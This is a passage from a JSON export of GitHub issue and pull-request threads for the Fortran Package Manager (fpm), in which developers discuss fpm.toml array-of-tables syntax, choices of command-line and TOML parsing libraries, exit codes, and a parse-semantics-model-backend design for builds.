            "date": "2020-08-15 19:11:15+00:00",
            "title": "examples with multiple executables and tests",
            "text": "I had created fpm.toml files that worked, but apparently were not correct toml files. With help from @LKedward I changed my list of executables to an array in several fpm.toml files which now passes tests as standard toml and still works; but when I try the same syntax with multiple test programs my tests are ignored. It is probably something simple but it took me a while just trying empirically to get everything running initially with multiple programs (realizing each one had to be in a seperate directory and so on). I was thinking I am not the only one likely to have these problems and that a more extensive example on this site showing the proper/preferred way to have multiple test programs and application executables would help avoid the problem and give me a solution. The first use I have made of TOML is for these fpm files so even if I get something to work I am not particularly confident it will be the \"right\" way.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-08-16 00:01:54+00:00",
                    "text": "Thanks for reporting the issue. I agree we need better examples and tests.\n\u2026\nOn Sat, Aug 15, 2020, at 1:11 PM, urbanjost wrote:\n\n\n I had created fpm.toml files that worked, but apparently were not\n correct toml files. With help from @LKedward\n <https://github.com/LKedward> I changed my list of executables to an\n array in several fpm.toml files which now passes tests as standard toml\n and still works; but when I try the same syntax with multiple test\n programs my tests are ignored. It is probably something simple but it\n took me a while just trying empirically to get everything running\n initially with multiple programs (realizing each one had to be in a\n seperate directory and so on). I was thinking I am not the only one\n likely to have these problems and that a more extensive example on this\n site showing the proper/preferred way to have multiple test programs\n and application executables would help avoid the problem and give me a\n solution. The first use I have made of TOML is for these fpm files so\n even if I get something to work I am not particularly confident it will\n be the \"right\" way.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#152>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEU6LBNIZHITWNKGL3SA3MV5ANCNFSM4QANIPSQ>."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-08-16 08:56:56+00:00",
                    "text": "I have the same set-up for the collection of modules I called \"pointsets\" -\nwith each test program in a separate directory, but the sources for the\nmodules in one and the same source directory. This works fine. If you need\nan example (for at least the current way), you could use that.\n\nRegards,\n\nArjen\n\nOp zo 16 aug. 2020 om 02:02 schreef Ond\u0159ej \u010cert\u00edk <notifications@github.com\n\u2026\n:\n Thanks for reporting the issue. I agree we need better examples and tests.\n\n On Sat, Aug 15, 2020, at 1:11 PM, urbanjost wrote:\n >\n >\n > I had created fpm.toml files that worked, but apparently were not\n > correct toml files. With help from @LKedward\n > <https://github.com/LKedward> I changed my list of executables to an\n > array in several fpm.toml files which now passes tests as standard toml\n > and still works; but when I try the same syntax with multiple test\n > programs my tests are ignored. It is probably something simple but it\n > took me a while just trying empirically to get everything running\n > initially with multiple programs (realizing each one had to be in a\n > seperate directory and so on). I was thinking I am not the only one\n > likely to have these problems and that a more extensive example on this\n > site showing the proper/preferred way to have multiple test programs\n > and application executables would help avoid the problem and give me a\n > solution. The first use I have made of TOML is for these fpm files so\n > even if I get something to work I am not particularly confident it will\n > be the \"right\" way.\n >\n > \u2014\n > You are receiving this because you are subscribed to this thread.\n > Reply to this email directly, view it on GitHub\n > <#152>, or unsubscribe\n > <\n https://github.com/notifications/unsubscribe-auth/AAAFAWEU6LBNIZHITWNKGL3SA3MV5ANCNFSM4QANIPSQ\n >.\n >\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#152 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7XA2AUSRXNZTVPFC3SA4OX5ANCNFSM4QANIPSQ>\n ."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-16 09:27:20+00:00",
                    "text": "when I try the same syntax with multiple test programs my tests are ignored.\n\nHi @urbanjost, this may be a subtle problem with the ordering of your fpm.toml file - does the inline array definition of test come after any previous (non-inline) array definition such as [[library]] or [[executable]], if so then the resulting data structure will have test as a sub-member of the previous definition and will hence be ignored at the top-level. This is IMO, an unfortunate subtlety of how Array of tables are defined in toml."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-08-16 19:06:01+00:00",
                    "text": "That was the major problem! Thanks. Still tweeking it but this particular module is primarily an interface to C POSIX routines. It is at least working again; although still tweeking it.\ngit clone https://github.com/urbanjost/M_system.git\n\n >>fpm.toml <<\n [dependencies]\n M_system        = { git = \"https://github.com/urbanjost/M_system.git\" }\n\nStill think some vetted examples here would be useful, of course."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 10:10:17+00:00",
                    "text": "Still think some vetted examples here would be useful, of course.\n\nAgreed. It would also be useful to mention the alternative compact notation for array-of-tables - useful for multiple executables/tests - and the above limitation."
                }
            ]
        },
        {
            "number": 151,
            "user": "everythingfunctional",
            "date": "2020-07-31 00:14:46+00:00",
            "title": "Refactor to make it easier to start developing the command line aspects",
            "text": "I'm proposing this as the start of the design for the command line aspects. I'm thinking I'll go ahead and start developing a command line parsing library, but the rest of the application doesn't need to know anything about it this way.\nUnfortunately, this makes fpm incapable of building itself now. Should we start hard-coding some stuff to at least keep that working?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-31 17:12:47+00:00",
                    "text": "It's basically just not doing anything to figure what order it needs to build the modules. Hardcoding it would be a short term solution, but will very quickly become a mess."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-31 17:27:44+00:00",
                    "text": "I looked more closely at FLAP. I really like the API, as it follows pretty closely the Python argparse library. However, it has a few limitations that I think rule it out.\n\nIt's licensed under GPLv3, which (I believe) is incompatible with fpm's MIT license\nIt doesn't support being built with fpm, and doesn't look very easy to convert (due to next issue)\nIt has several external dependencies that are managed as git submodules (a significant issue for bringing in as an fpm package)\nIt doesn't (seem to) support trailing, pass-through arguments (i.e. fpm run -- args to executable)\n\nI'm going to try and implement a very similar API, and will probably look at it for inspiration, but I just don't think it is the right solution for fpm right now"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-31 17:34:46+00:00",
                    "text": "Okay, I think I understand now. It's Fortran fpm that is trying to build itself in CI.\nI agree that we aim for this to work, but it seems to me a strange requirement to have right now. Fortran fpm conforms to the fpm package rules, but Fortran fpm does not have fpm build implemented to follow these rules. It seems to me like the wrong requirement to chase in this PR.\nInstead, I propose that:\n\nThe Fortran fpm test in CI should be to simply build the example project (generated by Haskell fpm new).\nTo pass the test the above, we need to either expand Haskell's fpm new to add a bare-bones app/main.f90, or only build the module in Fortran fpm build\n\n@certik does this seem like a reasonable compromise?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-31 17:40:38+00:00",
                    "text": "Brad, we discussed this a bit in #135. License is a non-issue (FLAP is multi-licensed). Your other bullets are real issues. However, nothing's stopping us from forking the project and pulling in the external dependencies. It could all be fpm-ized in a day, but no point in doing so until we are sure it's the road we want to take. I think it's too early to tell."
                },
                {
                    "user": "certik",
                    "date": "2020-07-31 18:15:27+00:00",
                    "text": "It's fine I guess if it can't build itself. It currently runs some tests, and we should add a few more to test it a bit."
                },
                {
                    "user": "certik",
                    "date": "2020-08-01 03:55:13+00:00",
                    "text": "I checked the tests, they seem to work. The Fortran FPM is tested on the simple hello world example, so I think we are in good shape and I merged it. I personally prefer more procedural approaches than the OO approach, but let's just try it, and we can refactor later if we decide in the future."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-01 02:42:32+00:00",
                    "text": "I implimented the parsing using M_CLI2 and added enough (Posix-dependent) system routines to impliment the \"new\" subcommand in https://github.com/urbanjost/M_CLI2.git in the subdirectory fpm.cli.  It also parses the other commands but does not do anything new with them other than echo the argument values to show the CLI parsing is working. Implimenting the \"new\" command was just to demonstrate the parsing, but if some can add equivalent routines for the mkdir,chdir,perror for other systems it would be portable, as the CLI interface is all Fortran. If this looks like it is sufficient details like completing the help text, etc. will be completed but I did not want to go much further if no concensus that this is sufficient is forthcoming. I have a basic Fortran-based utility for creating a basic Make file that could be used to do the builds (on systems with make) but  not much need to do step two if step one is not going to work out. Could not get a git request to work so it is not a pull request, just some files to replace fpm/src. If good enough feel free to move it to the git repository."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-01 06:42:52+00:00",
                    "text": "That should be doable with the stdlib_os module from stdlib. (I do not see\nit in the repository yet, though)\n\n\n\nOp di 1 sep. 2020 om 04:42 schreef urbanjost <notifications@github.com>:\n\u2026\n I implimented the parsing using M_CLI2 and added enough (Posix-dependent)\n system routines to impliment the \"new\" subcommand in\n https://github.com/urbanjost/M_CLI2.git in the subdirectory fpm.cli. It\n also parses the other commands but does not do anything new with them other\n than echo the argument values to show the CLI parsing is working.\n Implimenting the \"new\" command was just to demonstrate the parsing, but if\n some can add equivalent routines for the mkdir,chdir,perror for other\n systems it would be portable, as the CLI interface is all Fortran. If this\n looks like it is sufficient details like completing the help text, etc.\n will be completed but I did not want to go much further if no concensus\n that this is sufficient is forthcoming. I have a basic Fortran-based\n utility for creating a basic Make file that could be used to do the builds\n (on systems with make) but not much need to do step two if step one is not\n going to work out. Could not get a git request to work so it is not a pull\n request, just some files to replace fpm/src. If good enough feel free to\n move it to the git repository.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#151 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR63AYZUHKSKKG4MK7LSDRNSLANCNFSM4PO67LMQ>\n ."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 15:00:34+00:00",
                    "text": "Thanks @urbanjost! I think Brad is working on CLI parsing for fpm. @everythingfunctional, if you have any work done, can you push it to a branch on your fork so that @urbanjost can coordinate with you? If not, should we review @urbanjost's implementation?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 15:02:38+00:00",
                    "text": "@arjenmarkus Do you know the status of MarDiehl/stdlib_os regarding Windows? We discussed this briefly on the last call and as I understood from @MarDiehl, Windows still needed some work. Is that correct?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-01 17:11:34+00:00",
                    "text": "@milancurcic and @urbanjost , I'm currently working on a command line library that supports a more declarative style, and isn't hardwired to interrogating the real command line (i.e. calling get_command_argument). I haven't made a ton of progress yet, but you can check it out here.\nThe reason to do it this way, is it will make it possible to unit test the command line aspects, without needing external testing scripts, including how erroneous commands are handled. For example it becomes possible to write a unit test like, \"if a name for the new package isn't passed to the new command, an error is reported\", as well as \"if the '--with-test' flag is passed to the new command, the returned settings object has the with_test component set to true\", all without any connection to any I/O."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 17:46:54+00:00",
                    "text": "That sounds good to me. IMO the CLI stuff is not as high priority as stdlib_os so we can take some time to carefully design it. In the interim, Fortran intrinsics can get us by."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-02 00:20:39+00:00",
                    "text": "There are five command line parsers in my \"General Purpose Fortran\" repository. Like what you are proposing M_kracken can process arbitrary strings as well as the command line arguments, as it was was originally created as part of a Fortran-based shell and was not even used for command line parsing; M_CLI2 only does command line parsing by default, but was derived from a more general utility that allowed for the prototype parser to be called twice instead of calling the prototype parser and then the command line parser, but to truly test program execution the unit test program calls the test program recursively and does not need any external scripts to do do; albeit it builds a command stack and if that got big enough you could run out of process space. So you can write a Fortran code that tests the command line parser by actually calling it that does not require an external script. Between the M_system Posix interface and M_CLI/M_args/M_kracken/M_getopts/M_getopts_long/M_CLI2 command line crackers and M_io and M_debug/M_journal/M_msg unit testing modules and the regular expression routines and the make-file maker \"makeout\" all the parts except the toml reader and curl interface exist in that collection; except that the OS interface is POSIX-only so I have only used it in CygWin on a PC; but the general concensus here seemed to be to wait for the stdlib routines of the same or similar function to be developed so I did not see that an fpm using those would be acceptable. But M_CLI2 seemed a very good fit for the CLI interface module the Haskell fpm(1) model so I put together that code which I believe emulates all the current fpm(1) CLI interface plus allows for using -- instead of --args and allows for seperate help for each subcommand and I think is very easy to understand (usage requires one call per subcommand to set up the command options and parse the command line and then at a maxiumum a call to get_args for each keyword plus optional use of the array unnamed and string variable remaining for unassociated arguments on the command line.\nSo as an alternative you might look at the test program for the M_CLI2 module for how to test a command line parser by actually calling the program recursively.\nAlso, M_CLI2 has a routine in it for parsing a prototype string, but it does not behave exactly like calling the command line would (the string delimiter must be a double-quote, etc...).\nWe crossed paths apparently in that when I started that I did not see (or missed) that anyone was implementing a CLI interface and thought I would do it quickly enought that it would not needed announced until I had something working.\nMurphy;s Law at work, I suppose."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-02 09:25:46+00:00",
                    "text": "Hi Milan, Martin,\n\nI checked my notes, there were a few things that did not quite work:\nThey concern details of how Windows works (drives as a separate part\nof the file name), the MinGW environment posed some issues etc.\nAlso the test program is a trifle unixy - \"/home\", \"/bin\" are\ndirectories not normally encountered on Windows. So, yes, this\nrequires some attention. The basics work.\nI will pick this up in the coming few days.\n\nRegards,\n\nArjen\n\nOp di 1 sep. 2020 om 17:02 schreef Milan Curcic <notifications@github.com>:\n\u2026\n\n @arjenmarkus Do you know the status of MarDiehl/stdlib_os regarding Windows? We discussed this briefly on the last call and as I understood from @MarDiehl, Windows still needed some work. Is that correct?\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 17:37:13+00:00",
                    "text": "@urbanjost , it sounds like I need to take some time to go and look at your libraries in more detail. If that all works we may be able to get the Fortran version of fpm working a lot faster than I thought."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-03 19:08:48+00:00",
                    "text": "I just checked why the CMake build for Windows (VS C++ and Intel\nFortran) doesn't produce a test executable. The generated command to\nlink the program reads:\n\nC:/Program Files\n(x86)/IntelSWTools/compilers_and_libraries_2018.5.274/windows/bin/intel64/ifort.exe\n     -shared-intel @CMakeFiles\\stdlib_test.dir\\objects1.rsp -o\nstdlib_test.exe  user32.lib\n\nThe spaces in this command cause it to be interpreted as a command\n\"C:/Program\" - and of course, there is no such command.\n\nThe odd thing is that for the compile steps in the same generated file\n(build.make) use the \"short name\":\n\nC:\\PROGRA~2\\INTELS~1\\COMPIL~1.274\\windows\\bin\\intel64\\ifort.exe @<<\n...\n\nI have no idea why CMake is doing this. An examination of the *.cmake\nfiles does not give any clue. It may be better to leave the compiler\nidentification to the CMake installation altogether. I will experiment\nwith that.\n\nRegards,\n\nArjen\n\nOp wo 2 sep. 2020 om 11:25 schreef Arjen Markus <arjen.markus895@gmail.com>:\n\u2026\n\n Hi Milan, Martin,\n\n I checked my notes, there were a few things that did not quite work:\n They concern details of how Windows works (drives as a separate part\n of the file name), the MinGW environment posed some issues etc.\n Also the test program is a trifle unixy - \"/home\", \"/bin\" are\n directories not normally encountered on Windows. So, yes, this\n requires some attention. The basics work.\n I will pick this up in the coming few days.\n\n Regards,\n\n Arjen\n\n Op di 1 sep. 2020 om 17:02 schreef Milan Curcic ***@***.***>:\n >\n > @arjenmarkus Do you know the status of MarDiehl/stdlib_os regarding Windows? We discussed this briefly on the last call and as I understood from @MarDiehl, Windows still needed some work. Is that correct?\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-19 22:24:38+00:00",
                    "text": "@everythingfunctional.  I put a simple CLI interface together with M_CLI2 to demonstrate an approach I think could be a good starting point. I did not include the code for making any of the other parts functional but all the command arguments are parsed and displayed in the unimplemented subcommands for demonstration purposes. Since it only takes a few lines in everything except the fpm_command_line.f90 file it could easily be replaced later, but it seems easier to me to discuss the CLI from the perspective of a prototype.  Did you have a chance to look at any of the listed interfaces?\nNow that the TOML interface is in I think we can get a version that works on local files pretty quickly and it would be good to have the CLI in place to be able to pass options to run and test and new.\nDoes anyone have any ideas on whether there are existing utilities that can be depended on for dependencies or are people envisioning something totally in fortran, perhaps starting with daglib?\nIs libcurl common enough on non-POSIX systems to be looking at using the fortran-libcurl interface?  I have my own preprocessor and used that to jazz up my $INCLUDE directive on Redhat 8 and CygWin and it has worked very nicely\n(even the Fortran standard does not say the argument of an INCLUDE statement has to be a file on the current platform, but I do not know of one that lets you grab a file with https: or ftp: -- it is actually pretty handy).\nThe new subcommand would be a lot easier if there were a mkdir and a chdir function. Since gfortran has a lot of system extensions (as do most modern Fortran compilers if not all) having the arguments available would let that command be completely functional, at least up to the level of the Haskell fpm(1). Is if fair to use the extensions (assuming a CLI is in place, as most of new requires parameters to be implimented). I thought I saw were someone was working on new but cannot find it; but I am sure it would need CLI parameters."
                }
            ]
        },
        {
            "number": 150,
            "user": "everythingfunctional",
            "date": "2020-07-25 20:13:20+00:00",
            "title": "Propogate exit codes from tests and executables",
            "text": "Fix #143",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-25 21:06:41+00:00",
                    "text": "+1 to merge. I don't have time right now to test it, but the change looks good.\n\nEventually we have to add tests for all these things.\n\u2026\nOn Sat, Jul 25, 2020, at 2:47 PM, Milan Curcic wrote:\n\n\n ***@***.**** approved this pull request.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#150 (review)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWE4ZBYFMVPNLA4BNKLR5NAGRANCNFSM4PHTX5DA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-26 20:53:23+00:00",
                    "text": "I tried it out a couple of different ways and it worked, so I'm going to go ahead and merge."
                }
            ]
        },
        {
            "number": 149,
            "user": "milancurcic",
            "date": "2020-07-24 18:18:32+00:00",
            "title": "TOML parser",
            "text": "Part of #136\nI found 2, both support TOML v0.5 spec:\n\ntoml-f which is pure Fortran, but unfortunately GPLv3-licensed. We could ask the author to offer a more permissive license beside GPL.\nf_tomlc99 which interfaces a C parser. MIT-licensed.\n\nSo each presents an integration challenge.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-24 19:45:25+00:00",
                    "text": "In terms of easiness of use, we should try to stick to pure Fortran packages for fpm dependencies, since the non Fortran dependencies must be built somehow on all platforms for all users, and that can get messy --- we discussed just loading such packages from Conda as binaries on all platforms, which I think is preferable, but I was hoping to integrate with Conda in the Fortran fpm, and not worry about it for haskell fpm.\nAs such, we can probably quite easily improve haskell fpm to be able to compile C or C++ files inside an fpm package if we have to. But 3rd party non-Fortran dependencies will cause more issues I feel.\nConclusion: We have to tackle robust building / using of non Fortran dependencies, but I would worry about it a bit later, once Fortran fpm works well. So I would just stick to pure Fortran for now."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 19:58:23+00:00",
                    "text": "I asked the author of toml-f at awvwgk/toml-f#1 if he would be willing to relicence. If he would, that would be awesome, I think it's exactly what we are looking for."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-20 15:59:54+00:00",
                    "text": "It looks like toml-f will indeed be re-licensed to dual MIT/Apache-2.0 in an upcoming PR: awvwgk/toml-f#2. I notice this PR also includes an fpm.toml (though it relies on meson currently)."
                }
            ]
        },
        {
            "number": 148,
            "user": "milancurcic",
            "date": "2020-07-24 16:57:00+00:00",
            "title": "fpm command placeholders and expand help message",
            "text": "To warm up my Fortran fingers before the workday, I made a few benign UI improvements:\n\nExpand the print message, borrowing from fpm-haskell and Cargo\nAdd placeholder new, install, run, test commands and \"not implemented\" messages",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-24 18:04:10+00:00",
                    "text": "What GFortran version do you have? I have 7.5.0 and it returns a non zero exit value, as can be verified by:\n~/.../fpm/fpm(master)$ ./fpm \n Fortran Package Manager (fpm)\n OS Type: Linux\n~/.../fpm/fpm(master)$ echo $?\n0\n~/.../fpm/fpm(master)$ ./fpm xx\n Unknown command: xx                                                                                                  \nERROR STOP \n\nError termination. Backtrace:\n#0  0x7fd711f9b32a\n#1  0x7fd711f9bed5\n#2  0x7fd711f9cf86\n#3  0x555e59a321c7\n#4  0x555e59a32273\n#5  0x7fd711bb0b96\n#6  0x555e59a31fd9\n#7  0xffffffffffffffff\n~/.../fpm/fpm(master)$ echo $?\n1"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-24 18:07:42+00:00",
                    "text": "@LKedward I don't remember if we discussed fpm help, but it will sure be useful to display command-specific help messages, e.g. fpm help build (Cargo has it).\n@certik Never mind, now I can't reproduce it, which means that I mistakenly tested the exit code of something else that had it as 0. Are you fine with explicit error stop 1 or should I revert that one? I think at least this way the code will be consistent across compilers, if it's not already."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 18:11:52+00:00",
                    "text": "I don't mind what is in there, as it will get rewritten anyway eventually. I only don't like your commit message, as it implies that somehow error stop is bad, while my understanding of it is that it will always exit the program with non zero exit code."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-24 18:28:48+00:00",
                    "text": "@certik Now I'm confused. Does \"add exit code to error stop\" imply that it's bad? It merely states what was added to the code.\nBut more importantly, do you not think that error stop 1 is more robust than error stop? The standard recommends that error stop causes a non-zero exit code, so I think we can confidently trust that all compilers will do that. However, I don't know what error codes various compilers return, so even after the fact about my mistake I think this is an improvement."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 19:38:57+00:00",
                    "text": "I think you posted it in the comment not a commit log, my apologies. It's fine to merge as it is, so I am going to merge it.\nI am not sure if error stop 1 is more robust than error stop, unless you care about the value of the non zero code."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-24 19:43:58+00:00",
                    "text": "@certik Ah, okay, got it, all clear now. I agree, that comment was a mistake. I went back and crossed it over so it doesn't confuse anybody else.\nYes for explicit error stop code it will matter only when we want to set different codes. As you say, these are just placeholders so it doesn't matter for now."
                }
            ]
        },
        {
            "number": 147,
            "user": "certik",
            "date": "2020-07-22 22:19:30+00:00",
            "title": "Execute the newly built fpm",
            "text": "On all platforms.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-23 16:08:34+00:00",
                    "text": "This is just a simple addition to the CI, tests work, I am going to merge it."
                }
            ]
        },
        {
            "number": 146,
            "user": "certik",
            "date": "2020-07-22 21:07:45+00:00",
            "title": "Design a model that captures fpm's understanding of the project",
            "text": "The Fortran fpm should have a module that represents the semantics of all the information that fpm gathers about the project. Here is the pipeline of fpm build:\n\n\nParse: read fpm.toml, read src/*, read app/* (later also tests/*, examples/*, ...), read every Fortran file, determine if it is a program or a module, note module / program name, note all Fortran module dependencies.\n\n\nSemantics: checks that all the information is consistent: that module / program name is consistent with the filename, that module and package dependencies are present, that info in fpm.toml is consistent with the files that are present. In this phase we check for all errors and report nice error messages to the user if something is wrong. After this phase is over, the project is correct and can be compiled (there can be compiler error messages later on, but no fpm error messages).\n\n\nModel: The result of the phase 2. is saved in a standalone representation that we should be able to print out. This representation has all the information that later phases will require. And it is checked, in other words, all fpm errors are already reported. It is possible to print this representation out. I can imagine a lot of our tests can simply be to run fpm build --show-model that will only print the model out, but not do any build, and we check it against reference results, to ensure that fpm was able to gather and check all the information correctly.\n\n\nBackends:\na. Build backend: takes the Model (and nothing else) and builds the project\nb. CMake backend: takes the Model (and nothing else) and generates a CMake build system (#69) or a standalone tarball with all dependencies and a CMake build system (#123).\n\n\nThis design will ensure that the initially possibly messy and error prone parts in 1. and 2. are completely separated from the actual build or cmake backends, and that we can test each part separately. Also, even for our users it would be very helpful if fpm can print the Model in a nice form, so that users can check that fpm was able to understand their project correctly, before attempting to do any build. If the Model is not what users expected, then they know that fpm didn't understand their project correctly and they can report a bug, or rearrange their files or fpm.toml.\n\n@milancurcic, @everythingfunctional let me know if you want to do a quick phone call about this.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 21:17:02+00:00",
                    "text": "Regarding package dependencies: to have a complete Model without any missing Fortran modules, one might need to checkout every dependency (recursively) and execute 1. and 2. on it, to figure out what Fortran modules the dependency has, and then one can ensure that there are (globally) no missing modules.\nSo executing 1. and 2. on a given package will create a Model with possible missing Fortran modules. But downloading & executing 1. and 2. on each dependency (before building) we can construct a Model for each package and ensure that all the Models are consistent.\nSo part of the Model can be a structure like Package, and a full Model would then have a set of Packages with dependencies between them, etc. This full Model will then be an input to #123. Also one can then use this full Model to design a good parallel Build backend.\n\nI think from a practical perspective, it makes sense if a Model's Package structure is constructed locally for a given package, and checked for everything except missing Fortran modules. This can then be (even in parallel) repeated for each dependency, as this process is independent of order. Finally, at the end, this set of Packages is taken and checked that all missing modules resolve correctly according to the Package dependencies, and this resolved set of Packages then comprises the finished Model as part of step 3. Then one can hand it over to the backends  in 4.\nEach Package would know where on the disk the files are checked out. So when the backends in 4. start the work, no internet connection is needed, everything is checked out.\nThe only possible improvement is to start building while other packages are still downloading, but that's going to mess up the separation of things, so we might want to do it like Debian/Ubuntu, which first downloads all packages, and only then installs them in the correct order. So besides this very minor lack of optimization, this seems like a very clean design, that will allow us to maintain clean code and be very transparent to users."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-23 19:18:13+00:00",
                    "text": "@certik , I think this is a very good design. There are some details to flesh out (obviously), but this is quite similar to the way it's done in the Haskell version.\nI might add a step 0, parse the command line, as some commands do not require reading the fpm.toml or doing all (or even any) of the following steps. fpm new for example.\nWe probably should schedule a call. I'm swamped today and tomorrow, but should be able to squeeze it some time after that."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-23 19:27:30+00:00",
                    "text": "It looks good, I'm down for a call next week. Please email a few time slots for next week. It'd be good to also entrain anybody who's interested in getting more involved with fpm development."
                },
                {
                    "user": "certik",
                    "date": "2020-07-23 23:33:50+00:00",
                    "text": "Ok, the call is set for Tuesday 1pm PDT. If anyone else wants to join this discussion, you can, just comment here so that we can invite you."
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-24 09:59:53+00:00",
                    "text": "I'm interested in getting more involved with fpm development so would be interested in joining that call."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-24 10:07:28+00:00",
                    "text": "Same here :).\n\nOp vr 24 jul. 2020 om 12:00 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n I'm interested in getting more involved with fpm development so would be\n interested in joining that call.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#146 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5XJRXIPRZBWFSRA5LR5FLSRANCNFSM4PFDFI3Q>\n ."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 15:33:45+00:00",
                    "text": "@LKedward, @arjenmarkus perfect, thanks. I will post the meeting information here, so that you can join also."
                },
                {
                    "user": "certik",
                    "date": "2020-07-28 17:36:26+00:00",
                    "text": "Here is the Zoom meeting invitation at 1pm Pacific Time today.\nOnd\u0159ej \u010cert\u00edk is inviting you to a scheduled Zoom meeting.\nTopic: FPM Design Discussion\nTime: Jul 28, 2020 02:00 PM Mountain Time (US and Canada)\nJoin Zoom Meeting\nhttps://zoom.us/j/99897479516?pwd=UnpBL05la3YyYmVSdEo1T0VSVmJwUT09\nMeeting ID: 998 9747 9516\nPasscode: YY1XEv"
                },
                {
                    "user": "certik",
                    "date": "2020-07-28 19:57:18+00:00",
                    "text": "Just a reminder that the meeting starts in 3 minutes."
                },
                {
                    "user": "certik",
                    "date": "2020-07-28 21:13:15+00:00",
                    "text": "Summary of our meeting:\n\nLooks like we all agreed on the general design above.\nWe discussed some details such as:\n\nHow to test this: integration tests vs unit tests, vs integration tests with specific features to test. We will iterate as we go. We can use Vegetables for unit testing.\nHow to link C dependencies: include the linking information in the Model, backend links\nThe Model includes everything, including command line options\nAllow the Model to print to the screen (for testing and informational purposes)\nThat it is probably a good idea as a start to download all dependencies and figure out a Model that includes all the dependencies, and only then pass it over to the backend. Later we can investigate whether the backend cannot start building some files speculatively sooner.\n\n\nStep forward: refactor our current fpm to follow the design above: construct a Model, pass it to the backend."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-29 06:40:54+00:00",
                    "text": "Hi Ondrej, all,\n\nsorry I missed the meeting - I was home rather late and I did not see any\nmessage with a link to the meeting ;). I will try and catch up with the\nmaterial so far.\n\nRegards,\n\nArjen\n\nOp di 28 jul. 2020 om 23:13 schreef Ond\u0159ej \u010cert\u00edk <notifications@github.com\n\u2026\n:\n Summary of our meeting:\n\n    - Looks like we all agreed on the general design above.\n    - We discussed some details such as:\n       - How to test this: integration tests vs unit tests, vs integration\n       tests with specific features to test. We will iterate as we go. We can use\n       Vegetables for unit testing.\n       - How to link C dependencies: include the linking information in\n       the Model, backend links\n       - The Model includes everything, including command line options\n       - Allow the Model to print to the screen (for testing and\n       informational purposes)\n       - That it is probably a good idea as a start to download all\n       dependencies and figure out a Model that includes all the dependencies, and\n       only then pass it over to the backend. Later we can investigate whether the\n       backend cannot start building some files speculatively sooner.\n    - Step forward: refactor our current fpm to follow the design above:\n    construct a Model, pass it to the backend.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#146 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRZLWWNL4YBLV3QGJIDR545PVANCNFSM4PFDFI3Q>\n ."
                },
                {
                    "user": "certik",
                    "date": "2020-07-29 06:58:40+00:00",
